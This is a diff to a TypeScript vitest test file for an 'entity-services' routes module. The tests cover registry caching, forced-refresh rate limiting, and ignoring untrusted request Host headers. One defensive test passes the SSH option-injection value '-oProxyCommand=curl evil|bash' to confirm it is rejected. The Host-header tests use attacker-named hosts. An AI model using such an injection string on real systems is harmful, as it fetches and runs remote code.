@@ -1,6 +1,6 @@
-import { describe, expect, it, vi } from 'vitest';
+import { beforeEach, describe, expect, it, vi } from 'vitest';
 import type { LoadedPlugin } from '../types';
-import { buildServicesRegistry, buildSshExecArgs, getCachedServicesRegistry, registerPluginRoutes, validateSshTarget } from './routes';
+import { buildServicesRegistry, buildSshExecArgs, getCachedServicesRegistry, registerPluginRoutes, resetServicesRegistryStateForTests, validateSshTarget, type ServiceRegistryPayload } from './routes';
 
 function createLoadedPlugin(overrides: Partial<LoadedPlugin> = {}): LoadedPlugin {
   return {
@@ -41,6 +41,10 @@ function createResponse() {
 }
 
 describe('entity-services routes', () => {
+  beforeEach(() => {
+    resetServicesRegistryStateForTests();
+  });
+
   it('rejects ssh targets that could be parsed as ssh options', () => {
     expect(() => validateSshTarget('-oProxyCommand=curl evil|bash')).toThrow(
       'SSH target must not start with "-".',
@@ -220,7 +224,7 @@ describe('entity-services routes', () => {
     expect(payload.services.every((service) => service.status === 'offline')).toBe(true);
   });
 
-  it('prefers the live request host over stale tailnet service URLs', async () => {
+  it('prefers the configured runtime origin over stale tailnet service URLs', async () => {
     const entityServices = createLoadedPlugin({
       settings: {
         ...createLoadedPlugin().settings,
@@ -236,26 +240,29 @@ describe('entity-services routes', () => {
       enabled: true,
     });
 
-    const payload = await buildServicesRegistry(
-      {
-        plugin: entityServices,
-        registry: {
-          get: (id: string) => {
-            if (id === entityServices.id) return entityServices;
-            if (id === entityLinker.id) return entityLinker;
-            return undefined;
+    vi.stubEnv('ENTITY_BASE_URL', 'http://100.104.229.62:3000');
+    try {
+      const payload = await buildServicesRegistry(
+        {
+          plugin: entityServices,
+          registry: {
+            get: (id: string) => {
+              if (id === entityServices.id) return entityServices;
+              if (id === entityLinker.id) return entityLinker;
+              return undefined;
+            },
           },
-        },
-      } as any,
-      vi.fn(async () => new Response('ok', { status: 200 })) as any,
-      'http://100.104.229.62:3000',
-    );
+        } as any,
+        vi.fn(async () => new Response('ok', { status: 200 })) as any,
+      );
 
-    const linker = payload.services.find((service) => service.id === 'entity-linker');
-    const enterprise = payload.services.find((service) => service.id === 'enterprise-crew-admin');
-
-    expect(linker?.link.url).toBe('http://100.104.229.62:3000/api/entity-linker/status');
-    expect(enterprise?.link.url).toBe('http://100.104.229.62:3002');
+      const linker = payload.services.find((service) => service.id === 'entity-linker');
+      const enterprise = payload.services.find((service) => service.id === 'enterprise-crew-admin');
+      expect(linker?.link.url).toBe('http://100.104.229.62:3000/api/entity-linker/status');
+      expect(enterprise?.link.url).toBe('http://100.104.229.62:3002');
+    } finally {
+      vi.unstubAllEnvs();
+    }
   });
 
   it('returns a non-empty cold-start registry before full discovery settles', async () => {
@@ -335,9 +342,34 @@ describe('entity-services routes', () => {
     }));
   });
 
-  it('starts independent background refreshes for distinct registry cache keys', async () => {
-    const entityServices = createLoadedPlugin({
+  it('starts independent background refreshes for distinct trusted settings keys', async () => {
+    const firstPlugin = createLoadedPlugin({
       settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 765432 },
+    });
+    const secondPlugin = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 765433 },
+    });
+    const firstContext = {
+      plugin: firstPlugin,
+      registry: { get: (id: string) => (id === firstPlugin.id ? firstPlugin : undefined) },
+    } as any;
+    const secondContext = {
+      plugin: secondPlugin,
+      registry: { get: (id: string) => (id === secondPlugin.id ? secondPlugin : undefined) },
+    } as any;
+    const neverSettles = vi.fn(() => new Promise<ServiceRegistryPayload>(() => undefined));
+
+    await getCachedServicesRegistry(firstContext, 'http://trusted.local', neverSettles as any);
+    const callsAfterFirstKey = neverSettles.mock.calls.length;
+    await getCachedServicesRegistry(secondContext, 'http://trusted.local', neverSettles as any);
+
+    expect(neverSettles.mock.calls.length).toBeGreaterThan(callsAfterFirstKey);
+  });
+
+  it('ignores untrusted request Host values for discovery identity and probe targets', async () => {
+    vi.stubEnv('ENTITY_BASE_URL', 'http://trusted-runtime.local');
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 743210 },
     });
     const handlers: Record<string, (req: any, res: any) => Promise<any>> = {};
     registerPluginRoutes(
@@ -347,21 +379,252 @@ describe('entity-services routes', () => {
         registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
       } as any,
     );
-    const neverSettles = vi.fn(() => new Promise<Response>(() => undefined));
+    const neverSettles = vi.fn((_url: string) => new Promise<Response>(() => undefined));
     vi.stubGlobal('fetch', neverSettles);
     try {
       await handlers['GET /registry'](
-        { protocol: 'http', get: (name: string) => name === 'host' ? 'key-a.local' : undefined },
+        { protocol: 'https', get: (name: string) => name === 'host' ? 'attacker-a.invalid' : undefined, query: {} },
         createResponse(),
       );
-      const callsAfterFirstKey = neverSettles.mock.calls.length;
+      const callsAfterFirstHost = neverSettles.mock.calls.length;
       await handlers['GET /registry'](
-        { protocol: 'http', get: (name: string) => name === 'host' ? 'key-b.local' : undefined },
+        { protocol: 'http', get: (name: string) => name === 'host' ? 'attacker-b.invalid' : undefined, query: {} },
         createResponse(),
       );
-      expect(neverSettles.mock.calls.length).toBeGreaterThan(callsAfterFirstKey);
+      expect(neverSettles.mock.calls.length).toBe(callsAfterFirstHost);
+      expect(neverSettles.mock.calls.every(([url]) => String(url).includes('attacker-') === false)).toBe(true);
     } finally {
       vi.unstubAllGlobals();
+      vi.unstubAllEnvs();
+    }
+  });
+
+  it('projects usable stale data as refreshing while revalidation is active', async () => {
+    vi.useFakeTimers();
+    vi.setSystemTime(new Date('2026-08-14T03:00:00.000Z'));
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 732109 },
+    });
+    const context = {
+      plugin: entityServices,
+      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
+    } as any;
+    const readyPayload = await buildServicesRegistry(
+      context,
+      vi.fn(async () => new Response('ok', { status: 200 })) as any,
+      'http://trusted-stale.local',
+    );
+    try {
+      await getCachedServicesRegistry(context, 'http://trusted-stale.local', async () => readyPayload);
+      await Promise.resolve();
+      await Promise.resolve();
+      vi.advanceTimersByTime(16_000);
+      const neverSettles = vi.fn(() => new Promise<typeof readyPayload>(() => undefined));
+
+      const staleWhileRefreshing = await getCachedServicesRegistry(
+        context,
+        'http://trusted-stale.local',
+        neverSettles as any,
+      );
+
+      expect(neverSettles).toHaveBeenCalledTimes(1);
+      expect(staleWhileRefreshing).toMatchObject({
+        state: 'refreshing',
+        partial: true,
+        services: readyPayload.services,
+      });
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  it('projects retained usable error data as refreshing while a retry is active', async () => {
+    vi.useFakeTimers();
+    vi.setSystemTime(new Date('2026-08-14T03:15:00.000Z'));
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 710321 },
+    });
+    const context = {
+      plugin: entityServices,
+      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
+    } as any;
+    const readyPayload: ServiceRegistryPayload = {
+      ...await buildServicesRegistry(
+        context,
+        vi.fn(async () => new Response('ok', { status: 200 })) as any,
+        'http://retry.local',
+      ),
+      services: [{ id: 'kept', name: 'Kept', kind: 'external', status: 'online' }] as any,
+    };
+
+    try {
+      await getCachedServicesRegistry(context, 'http://retry.local', async () => readyPayload);
+      await Promise.resolve();
+      await Promise.resolve();
+      await getCachedServicesRegistry(
+        context,
+        'http://retry.local',
+        async () => { throw new Error('probe failed'); },
+        { forceRefresh: true },
+      );
+      await Promise.resolve();
+      await Promise.resolve();
+      vi.advanceTimersByTime(15_001);
+
+      const retrying = await getCachedServicesRegistry(
+        context,
+        'http://retry.local',
+        () => new Promise<ServiceRegistryPayload>(() => undefined),
+      );
+
+      expect(retrying.state).toBe('refreshing');
+      expect(retrying.partial).toBe(true);
+      expect(retrying.refreshError).toBeUndefined();
+      expect(retrying.services.map((service) => service.id)).toContain('kept');
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  it('supports an explicit force refresh within the normal freshness TTL', async () => {
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 721098 },
+    });
+    const context = {
+      plugin: entityServices,
+      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
+    } as any;
+    const readyPayload = await buildServicesRegistry(
+      context,
+      vi.fn(async () => new Response('ok', { status: 200 })) as any,
+      'http://force-refresh.local',
+    );
+    const firstBuild = vi.fn(async () => readyPayload);
+    await getCachedServicesRegistry(context, 'http://force-refresh.local', firstBuild as any);
+    await Promise.resolve();
+    await Promise.resolve();
+    const forcedBuild = vi.fn(() => new Promise<typeof readyPayload>(() => undefined));
+
+    const forced = await getCachedServicesRegistry(
+      context,
+      'http://force-refresh.local',
+      forcedBuild as any,
+      { forceRefresh: true },
+    );
+
+    expect(forcedBuild).toHaveBeenCalledTimes(1);
+    expect(forced).toMatchObject({ state: 'refreshing', partial: true, services: readyPayload.services });
+  });
+
+  it('projects a fresh cached registry as refreshing while a forced refresh is in flight', async () => {
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 721099 },
+    });
+    const context = {
+      plugin: entityServices,
+      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
+    } as any;
+    const readyPayload = await buildServicesRegistry(
+      context,
+      vi.fn(async () => new Response('ok', { status: 200 })) as any,
+      'http://force-poll.local',
+    );
+    await getCachedServicesRegistry(context, 'http://force-poll.local', async () => readyPayload);
+    await Promise.resolve();
+    await Promise.resolve();
+    const neverSettles = vi.fn(() => new Promise<typeof readyPayload>(() => undefined));
+    await getCachedServicesRegistry(
+      context,
+      'http://force-poll.local',
+      neverSettles as any,
+      { forceRefresh: true },
+    );
+
+    const polled = await getCachedServicesRegistry(
+      context,
+      'http://force-poll.local',
+      neverSettles as any,
+    );
+
+    expect(neverSettles).toHaveBeenCalledTimes(1);
+    expect(polled).toMatchObject({ state: 'refreshing', partial: true, services: readyPayload.services });
+  });
+
+  it('rate-limits sequential forced refreshes to one per registry TTL', async () => {
+    vi.useFakeTimers();
+    vi.setSystemTime(new Date('2026-08-14T03:30:00.000Z'));
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 705432 },
+    });
+    const context = {
+      plugin: entityServices,
+      registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
+    } as any;
+    const readyPayload = await buildServicesRegistry(
+      context,
+      vi.fn(async () => new Response('ok', { status: 200 })) as any,
+      'http://rate-limit.local',
+    );
+    try {
+      await getCachedServicesRegistry(context, 'http://rate-limit.local', async () => readyPayload);
+      await Promise.resolve();
+      await Promise.resolve();
+      const firstForcedBuild = vi.fn(async () => readyPayload);
+      await getCachedServicesRegistry(
+        context,
+        'http://rate-limit.local',
+        firstForcedBuild as any,
+        { forceRefresh: true },
+      );
+      await Promise.resolve();
+      await Promise.resolve();
+      const secondForcedBuild = vi.fn(async () => readyPayload);
+
+      const secondForced = await getCachedServicesRegistry(
+        context,
+        'http://rate-limit.local',
+        secondForcedBuild as any,
+        { forceRefresh: true },
+      );
+
+      expect(firstForcedBuild).toHaveBeenCalledTimes(1);
+      expect(secondForcedBuild).not.toHaveBeenCalled();
+      expect(secondForced.state).toBe('ready');
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  it('maps the refresh query parameter to a forced HTTP-route revalidation', async () => {
+    vi.stubEnv('ENTITY_BASE_URL', 'http://route-refresh.local');
+    const entityServices = createLoadedPlugin({
+      settings: { ...createLoadedPlugin().settings, requestTimeoutMs: 710987 },
+    });
+    const handlers: Record<string, (req: any, res: any) => Promise<any>> = {};
+    registerPluginRoutes(
+      { get: (route: string, handler: any) => { handlers[`GET ${route}`] = handler; } } as any,
+      {
+        plugin: entityServices,
+        registry: { get: (id: string) => (id === entityServices.id ? entityServices : undefined) },
+      } as any,
+    );
+    const fetchMock = vi.fn(async () => new Response('ok', { status: 200 }));
+    vi.stubGlobal('fetch', fetchMock);
+    try {
+      await handlers['GET /registry']({ query: {} }, createResponse());
+      await Promise.resolve();
+      await Promise.resolve();
+      await new Promise((resolve) => setTimeout(resolve, 0));
+      const callsAfterWarm = fetchMock.mock.calls.length;
+
+      const forcedResponse = createResponse();
+      await handlers['GET /registry']({ query: { refresh: '1' } }, forcedResponse);
+
+      expect(fetchMock.mock.calls.length).toBeGreaterThan(callsAfterWarm);
+      expect(forcedResponse.json.mock.calls[0]?.[0]).toMatchObject({ state: 'refreshing', partial: true });
+    } finally {
+      vi.unstubAllGlobals();
+      vi.unstubAllEnvs();
     }
   });
 
